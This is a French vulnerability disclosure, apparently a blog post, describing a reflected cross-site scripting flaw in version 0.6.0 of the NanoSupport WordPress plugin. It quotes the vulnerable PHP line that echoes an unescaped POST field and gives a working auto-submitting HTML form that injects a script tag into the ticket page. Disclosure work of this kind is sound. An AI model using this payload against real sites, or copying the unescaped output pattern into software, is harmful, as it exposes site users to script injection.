---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress NanoSupport — Support Ticketing & Knowledgebase for WordPress"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [NanoSupport — Support Ticketing & Knowledgebase for WordPress](https://wpscan.com/plugin/nanosupport/) (slug: `nanosupport`) se présente de cette façon :

> Create a fully featured Support Center within your WordPress environment without any third party system dependency, for completely FREE of cost.
> 
> No 3rd party support ticketing system required, no external site/API dependency, simply create your own fully featured Support Center within your WordPress environment, and take your support into the next level.
> 
> It has built-in Knowledgebase that is integrated to put generalized information for public acknowledgement.

La version testée est la 0.6.0 et date d'il y a 3 ans au moment de ces lignes.

## La vulnérabilité

Le script `nanosupport.php` du plugin inclut différents scripts dont `includes/shortcodes/ns-submit-ticket.php`.

Ce dernier définit un shortcode :

```php
add_shortcode( 'nanosupport_submit_ticket', 'ns_submit_support_ticket' )
```

La fonction `ns_submit_support_ticket` en question effectue tout un tas d'opérations, mais c'est surtout cette ligne qui est vulnérable :

```php
<input type="text" class="ns-form-control" name="ns_ticket_subject"
 id="ns-ticket-subject" placeholder="<?php esc_attr_e( 'Subject in brief', 'nanosupport' ); ?>"
 value="<?php echo !empty($_POST['ns_ticket_subject']) ? stripslashes_deep( $_POST['ns_ticket_subject'] ) : ''; ?>" aria-describedby="ns-subject" required autocomplete="off">
```

La fonction [stripslashes_deep](https://developer.wordpress.org/reference/functions/stripslashes_deep/) utilisée sur le paramètre `ns_ticket_subject`  ne protège en aucun cas de l'injection de code HTML et/ou Javascript.

PoC utilisant un formulaire en auto-submit :

```html
<html>
<body>
<form id="myForm" method="POST" action="http://localhost:8000/?page_id=6">
        <input type="hidden" name="ns_ticket_subject" value="&quot;&gt;&lt;ScRiPt&gt;alert(/wav2prlu88/)&lt;/sCrIpT&gt;" />
        <input type="hidden" name="ns_ticket_details" value="Hi there!" />
</form>
<script>document.createElement('form').submit.call(document.getElementById('myForm'));</script>
</body>
</html>
```

À noter que la page sur laquelle doivent être envoyées les données doit être celle correspondant à la soumission de tickets (lien `Submit Ticket` sur le Wordpress).
